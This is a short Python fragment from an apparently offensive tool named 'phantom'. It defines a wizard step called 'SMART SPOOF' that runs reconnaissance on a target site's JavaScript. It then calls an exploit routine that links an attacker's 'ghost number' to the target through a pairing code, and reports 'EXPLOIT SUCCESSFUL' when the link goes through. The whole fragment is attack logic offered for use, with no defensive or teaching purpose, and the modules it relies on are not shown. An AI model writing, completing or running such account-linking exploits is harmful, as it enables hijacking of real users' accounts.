# This will be inserted into the Wizard's run method.
# We'll patch the existing Wizard using a sed command.

def step5_smart_exploit(self):
    """Use advanced recon or captured token to hit the real endpoint."""
    self._header("STEP 5: SMART SPOOF")
    print()
    self._info("Attempting exploit using discovered API endpoint...")

    from phantom.recon_adv import PlatformRecon
    # If we didn't capture any endpoint via browser spy, run static recon
    if not self.session.get("captured_endpoint"):
        self._info("No captured endpoint. Running static JS analysis...")
        recon = PlatformRecon(self.session["target_url"])
        success = recon.run(self.session["ghost_number"], self.session["pairing_code"])
        if success:
            self.session["vector_used"] = "static_recon"
            self.session["status"] = "linked"
            self._success("EXPLOIT SUCCESSFUL via static JS analysis!")
            return
        else:
            self._warning("Static recon failed. Trying captured endpoint fallback...")

    # Fallback to captured endpoint if available (original logic)
    endpoint = self.session.get("captured_endpoint")
    # ... rest of token-based logic ...
    # (but we'll simply delegate to the original exploit engine here)
    # For now, use the old multi-vector approach
    result = trigger_link_success(
        {"confirm_url": endpoint or "", "target_url": self.session["target_url"]},
        self.session["pairing_code"],
        self.session["ghost_number"]
    )
    self.session["vector_used"] = result.get("vector_used", "generic")
    self.session["status"] = result.get("status", "failed")
    if result.get("status") == "linked":
        self._success("EXPLOIT SUCCESSFUL!")
    else:
        self._warning(f"Exploit status: {result.get('status')}")
